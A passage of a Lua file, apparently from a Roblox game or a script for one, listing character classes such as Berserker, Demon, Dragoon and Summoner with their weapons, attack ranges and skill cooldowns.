            Skill = 'BlockingPaladin',
            Cooldown = 0.37,
            Range = 9
        }, {
            Skill = 'Paladin1',
            Cooldown = 0.52
        }, {
            Skill = 'Paladin2',
            Cooldown = 0.52
        }, {
            Skill = 'Paladin3',
            Cooldown = 0.52
        }, {
            Skill = 'Paladin4',
            Cooldown = 0.52
        }, {
            Skill = 'LightPaladin1',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightPaladin2',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightPaladin3',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightPaladin4',
            Cooldown = 0.52,
            Range = 19
        }, {
            Skill = 'LightThrust1',
            Cooldown = 9,
            Range = 19
        }, {
            Skill = 'LightThrust2',
            Cooldown = 9,
            Range = 19
        }, {
            Skill = bc:WaitForChild('Paladin'):WaitForChild('GuildedLight'),
            Cooldown = 15.2,
            Type = 'Heal'
        }}
    },
    Berserker = {
        DisplayName = 'Berserker',
        Range = 19.5,
        Type = 'Melee',
        Primary = 'Greataxe',
        Offhand = 'Greataxe',
        Skills = {{
            Skill = 'Berserker1',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker2',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker3',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker4',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker5',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'Berserker6',
            Cooldown = 0.51,
            Type = 'Ranged'
        }, {
            Skill = 'AggroSlam',
            Cooldown = 5.2,
            Range = 39,
            Type = 'Ranged'
        }, {
            Skill = 'GigaSpin1',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin2',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin3',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin4',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin5',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin6',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin7',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'GigaSpin8',
            Cooldown = 7.2,
            Range = 16
        }, {
            Skill = 'Fissure1',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'Fissure2',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt1',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt2',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt3',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt4',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt5',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt6',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt7',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = 'FissureErupt8',
            Cooldown = 10.2,
            Range = 9
        }, {
            Skill = bc:WaitForChild('Berserker'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }}
    },
    Guardian = {
        DisplayName = 'Guardian',
        Range = 14.5,
        Type = 'Melee',
        Primary = 'Greatsword',
        Skills = {{
            Skill = 'Guardian1',
            Cooldown = 0.6
        }, {
            Skill = 'Guardian2',
            Cooldown = 0.6
        }, {
            Skill = 'Guardian3',
            Cooldown = 0.6
        }, {
            Skill = 'Guardian4',
            Cooldown = 0.6
        }, {
            Skill = 'RockSpikes1',
            Cooldown = 6.1,
            Range = 29,
            Type = 'Ranged'
        }, {
            Skill = 'RockSpikes2',
            Cooldown = 6.1,
            Range = 31,
            Type = 'Ranged'
        }, {
            Skill = 'RockSpikes3',
            Cooldown = 6.1,
            Range = 34,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury1',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury2',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury3',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury4',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury5',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury6',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury7',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = 'SlashFury8',
            Cooldown = 7.1,
            Range = 44,
            Type = 'Ranged'
        }, {
            Skill = bc:WaitForChild('Guardian'):WaitForChild('AggroDraw'),
            Cooldown = 14.5,
            Type = 'Remote'
        }, {
            Skill = 'SwordPrison1',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison2',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison3',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison4',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison5',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison6',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison7',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison8',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison9',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison10',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison11',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }, {
            Skill = 'SwordPrison12',
            Cooldown = 30.2,
            Range = 120,
            Type = 'Ranged'
        }}
    },
    Demon = {
        DisplayName = 'Demon',
        Range = 12,
        Type = 'Ranged',
        Primary = 'Scythe',
        Skills = {{
            Skill = 'Demon1',
            Cooldown = 0.85
        }, {
            Skill = 'Demon2',
            Cooldown = 0.85
        }, {
            Skill = 'Demon3',
            Cooldown = 0.85
        }, {
            Skill = 'Demon4',
            Cooldown = 1.2
        }, {
            Skill = 'Demon5',
            Cooldown = 1.2
        }, {
            Skill = 'Demon6',
            Cooldown = 1.2
        }, {
            Skill = 'Demon7',
            Cooldown = 1.5
        }, {
            Skill = 'Demon8',
            Cooldown = 1.5
        }, {
            Skill = 'Demon9',
            Cooldown = 1.5
        }, {
            Skill = 'Demon10',
            Cooldown = 1.85
        }, {
            Skill = 'Demon11',
            Cooldown = 1.85
        }, {
            Skill = 'Demon12',
            Cooldown = 1.85
        }, {
            Skill = 'Demon13',
            Cooldown = 2.15
        }, {
            Skill = 'Demon14',
            Cooldown = 2.15
        }, {
            Skill = 'Demon15',
            Cooldown = 2.15
        }, {
            Skill = 'Demon16',
            Cooldown = 2.55
        }, {
            Skill = 'Demon17',
            Cooldown = 2.55
        }, {
            Skill = 'Demon18',
            Cooldown = 2.55
        }, {
            Skill = 'Demon19',
            Cooldown = 2.85
        }, {
            Skill = 'Demon20',
            Cooldown = 2.85
        }, {
            Skill = 'Demon21',
            Cooldown = 2.85
        }, {
            Skill = 'Demon22',
            Cooldown = 3.2
        }, {
            Skill = 'Demon23',
            Cooldown = 3.2
        }, {
            Skill = 'Demon24',
            Cooldown = 3.2
        }, {
            Skill = 'Demon25',
            Cooldown = 3.5
        }, {
            Skill = 'Demon26',
            Cooldown = 3.5
        }, {
            Skill = 'Demon27',
            Cooldown = 3.5
        }, {
            Skill = 'DemonDPS1',
            Cooldown = 0.85,
            Range = 12
        }, {
            Skill = 'DemonDPS2',
            Cooldown = 1.2,
            Range = 12
        }, {
            Skill = 'DemonDPS3',
            Cooldown = 1.5,
            Range = 12
        }, {
            Skill = 'DemonDPS4',
            Cooldown = 1.85,
            Range = 12
        }, {
            Skill = 'DemonDPS5',
            Cooldown = 2.15,
            Range = 12
        }, {
            Skill = 'DemonDPS6',
            Cooldown = 2.55,
            Range = 12
        }, {
            Skill = 'DemonDPS7',
            Cooldown = 2.9,
            Range = 12
        }, {
            Skill = 'DemonDPS8',
            Cooldown = 3.3,
            Range = 12
        }, {
            Skill = 'DemonDPS9',
            Cooldown = 3.6,
            Range = 12
        }, {
            Skill = 'ScytheThrowDPS1',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 71
        }, {
            Skill = 'ScytheThrowDPS2',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 71
        }, {
            Skill = 'ScytheThrowDPS3',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 71
        }, {
            Skill = 'ScytheThrow1',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow2',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow3',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow4',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow5',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow6',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow7',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'ScytheThrow8',
            Cooldown = 5.5,
            Type = 'Ranged',
            Range = 88
        }, {
            Skill = 'DemonLifeStealDPS',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 56
        }, {
            Skill = bc:WaitForChild('Demon'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }, {
            Skill = 'DemonSoulDPS1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 26
        }, {
            Skill = 'DemonSoulDPS2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 26
        }, {
            Skill = 'DemonSoulDPS3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 26
        }}
    },
    Swordmaster = {
        DisplayName = 'Swordmaster',
        Range = 14,
        Type = 'Melee',
        Primary = 'Longsword',
        Skills = {{
            Skill = 'Swordmaster1',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster2',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster3',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster4',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster5',
            Cooldown = 0.33
        }, {
            Skill = 'Swordmaster6',
            Cooldown = 0.33
        }, {
            Skill = 'CrescentStrike1',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike2',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike3',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike4',
            Cooldown = 5.2
        }, {
            Skill = 'CrescentStrike5',
            Cooldown = 5.2
        }, {
            Skill = 'Leap',
            Cooldown = 8.2,
            Range = 14
        }}
    },
    Mage = {
        DisplayName = 'Arcane Mage',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'Mage1',
            Cooldown = 0.33
        }, {
            Skill = 'Mage2',
            Cooldown = 0.33
        }, {
            Skill = 'Mage3',
            Cooldown = 0.33
        }, {
            Skill = 'ArcaneBlast',
            Cooldown = 5.2,
            Range = 42
        }, {
            Skill = 'ArcaneBlastAOE',
            Cooldown = 5.2,
            Range = 42
        }, {
            Skill = 'ArcaneWave1',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave2',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave3',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave4',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave5',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave6',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave7',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave8',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave9',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave10',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave11',
            Cooldown = 8.2,
            Range = 36
        }, {
            Skill = 'ArcaneWave12',
            Cooldown = 8.2,
            Range = 36
        }}
    },
    Defender = {
        DisplayName = 'Defender',
        Range = 12,
        Type = 'Melee',
        Primary = 'Greataxe',
        Skills = {{
            Skill = 'Defender1',
            Cooldown = 0.66
        }, {
            Skill = 'Defender2',
            Cooldown = 0.66
        }, {
            Skill = 'Defender3',
            Cooldown = 0.66
        }, {
            Skill = 'Defender4',
            Cooldown = 0.66
        }, {
            Skill = 'Defender5',
            Cooldown = 0.66
        }, {
            Skill = 'Groundbreaker',
            Cooldown = 5.1,
            Range = 9
        }, {
            Skill = 'Spin1',
            Cooldown = 8.1,
            Range = 10
        }, {
            Skill = 'Spin2',
            Cooldown = 8.1,
            Range = 10
        }, {
            Skill = 'Spin3',
            Cooldown = 8.1,
            Range = 10
        }, {
            Skill = 'Spin4',
            Cooldown = 8.1,
            Range = 10
        }}
    },
    DualWielder = {
        DisplayName = 'Dual Wielder',
        Range = 12,
        Type = 'Melee',
        Primary = 'Longsword',
        Offhand = 'Longsword',
        Skills = {{
            Skill = 'DualWield1',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield2',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield3',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield4',
            Cooldown = 0.55
        }, {
            Skill = 'DualWield5',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield6',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield7',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield8',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield9',
            Cooldown = 0.75
        }, {
            Skill = 'DualWield10',
            Cooldown = 0.75
        }, {
            Skill = bc:WaitForChild('DualWielder'):WaitForChild('AttackBuff'),
            Cooldown = 12.2,
            Type = 'Remote'
        }, {
            Skill = 'DashStrike',
            Cooldown = 6.2
        }, {
            Skill = 'CrossSlash1',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash2',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash3',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash4',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash5',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash6',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash7',
            Cooldown = 8 - 2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash8',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash9',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = 'CrossSlash10',
            Cooldown = 8.2,
            Type = 'Ranged',
            Range = 47
        }, {
            Skill = bc:WaitForChild('DualWielder'):WaitForChild('Ultimate'),
            Cooldown = 31,
            Type = 'Remote'
        }, {
            Skill = 'DualWieldUltimateHit1',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit2',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit3',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit4',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit5',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit6',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit7',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateHit8',
            Cooldown = 31
        }, {
            Skill = 'DualWieldUltimateSlam',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSlam1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSlam2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSlam3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword4',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword5',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword6',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword7',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword8',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword9',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword10',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword11',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword12',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword13',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword14',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword15',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }, {
            Skill = 'DualWieldUltimateSword16',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 17
        }}
    },
    IcefireMage = {
        DisplayName = 'Elementalist',
        Range = 93,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'IcefireMage1',
            Cooldown = 0.33
        }, {
            Skill = 'IcefireMage2',
            Cooldown = 0.33
        }, {
            Skill = 'IcefireMage3',
            Cooldown = 0.33
        }, {
            Skill = 'IcySpikes1',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes2',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes3',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes4',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcySpikes5',
            Cooldown = 6.2,
            Range = 36
        }, {
            Skill = 'IcefireMageFireball',
            Cooldown = 10.2
        }, {
            Skill = 'IcefireMageFireballBlast',
            Cooldown = 10.2
        }, {
            Skill = 'LightningStrike1',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike2',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike3',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike4',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'LightningStrike5',
            Cooldown = 15.2,
            Range = 46
        }, {
            Skill = 'IcefireMageUltimateFrost',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor1',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor2',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor3',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor4',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor5',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor6',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor7',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor8',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor9',
            Cooldown = 31,
            Range = 56
        }, {
            Skill = 'IcefireMageUltimateMeteor10',
            Cooldown = 31,
            Range = 56
        }}
    },
    Dragoon = {
        DisplayName = 'Dragoon',
        Range = 12,
        Type = 'Ranged',
        Primary = 'Spear',
        Skills = {{
            Skill = 'Dragoon1',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon2',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon3',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon4',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon5',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'Dragoon6',
            Cooldown = 0.45,
            Type = 'Melee'
        }, {
            Skill = 'DragoonDash',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross1',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross2',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross3',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross4',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross5',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross6',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross7',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross8',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross9',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'DragoonCross10',
            Cooldown = 6.2,
            Range = 17
        }, {
            Skill = 'MultiStrike1',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike2',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike3',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike4',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrike5',
            Cooldown = 6.2,
            Type = 'Melee',
            Range = 18
        }, {
            Skill = 'MultiStrikeDragon1',
            Cooldown = 6.2,
            Range = 57
        }, {
            Skill = 'MultiStrikeDragon2',
            Cooldown = 6.2,
            Range = 57
        }, {
            Skill = 'MultiStrikeDragon3',
            Cooldown = 6.2,
            Range = 57
        }, {
            Skill = 'DragoonFall',
            Cooldown = 8.2,
            Range = 5
        }, {
            Skill = bc:WaitForChild('Dragoon'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }, {
            Skill = 'DragoonUltimate',
            Cooldown = 31,
            Range = 46
        }, {
            Skill = 'UltimateDragon1',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon2',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon3',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon4',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon5',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon6',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon7',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon8',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon9',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon10',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon11',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon12',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon13',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon14',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon15',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon16',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon17',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon18',
            Cooldown = 31,
            Range = 94
        }}
    },
    Archer = {
        DisplayName = 'Archer',
        Range = 79,
        Type = 'Ranged',
        Primary = 'Bow',
        Skills = {{
            Skill = 'Archer',
            Cooldown = 0.47
        }, {
            Skill = 'PiercingArrow1',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow2',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow3',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow4',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow5',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow6',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow7',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow8',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow9',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'SpiritBomb',
            Cooldown = 10.2,
            Range = 208
        }, {
            Skill = 'MortarStrike1',
            Cooldown = 12.2,
            Range = 59
        }, {
            Skill = 'MortarStrike2',
            Cooldown = 12.2,
            Range = 76
        }, {
            Skill = 'MortarStrike3',
            Cooldown = 12.2,
            Range = 93
        }, {
            Skill = 'MortarStrike4',
            Cooldown = 12.2,
            Range = 110
        }, {
            Skill = 'MortarStrike5',
            Cooldown = 12.2,
            Range = 127
        }, {
            Skill = 'MortarStrike6',
            Cooldown = 12.2,
            Range = 144
        }, {
            Skill = 'MortarStrike7',
            Cooldown = 12.2,
            Range = 161
        }, {
            Skill = 'MortarStrike8',
            Cooldown = 12.2,
            Range = 179
        }, {
            Skill = 'HeavenlySword1',
            Cooldown = 31,
            Range = 143
        }, {
            Skill = 'HeavenlySword2',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword3',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword4',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword5',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword6',
            Cooldown = 31,
            Range = 99
        }}
    },
    Summoner = {
        DisplayName = 'Summoner',
        Range = 82,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'Summoner1',
            Cooldown = 0.55
        }, {
            Skill = 'Summoner2',
            Cooldown = 0.75
        }, {
            Skill = 'Summoner3',
            Cooldown = 1.05
        }, {
            Skill = 'Summoner4',
            Cooldown = 1.3
        }, {
            Skill = 'SoulHarvest1',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 16
        }, {
            Skill = 'SoulHarvest2',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = 'SoulHarvest3',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = 'SoulHarvest4',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = 'SoulHarvest5',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = bc:WaitForChild('Summoner'):WaitForChild('SoulHarvest'),
            Cooldown = 10.2,
            Type = 'Remote',
            Args = "MobPosition",
            Range = 39
        }, {
            Skill = bc:WaitForChild('Summoner'):WaitForChild('Summon'),
            Cooldown = 0.5,
            Type = 'Remote'
        }, {
            Skill = bc:WaitForChild('Summoner'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }}
    },
    Necromancer = {
        DisplayName = 'Necromancer',
        Range = 14,
        Type = 'Melee',
        Primary = 'Scythe',
        Skills = {{
            Skill = 'NecroDPS1',
            Cooldown = 0.8
        }, {
            Skill = 'NecroDPS2',
            Cooldown = 1.2
        }, {
            Skill = 'NecroDPS3',
            Cooldown = 1.5
        }, {
            Skill = 'NecroDPS4',
            Cooldown = 1.9
        }, {
            Skill = 'NecroDPS5',
            Cooldown = 2.2
        }, {
            Skill = 'NecroDPS6',
            Cooldown = 2.5
        }, {
            Skill = 'NecroDPS7',
            Cooldown = 2.8
        }, {
            Skill = 'NecroDPS8',
            Cooldown = 3.2
        }, {
            Skill = 'NecroDPS9',
            Cooldown = 3.5
        }, {
            Skill = 'SpiritExplosion0',
            Cooldown = 2.25,
            Range = 17,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion1',
            Cooldown = 2.25,
            Range = 17,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion2',
            Cooldown = 3,
            Range = 18,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion3',
            Cooldown = 3.25,
            Range = 21,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion4',
            Cooldown = 4,
            Range = 24,
            Type = 'Self'
        }, {
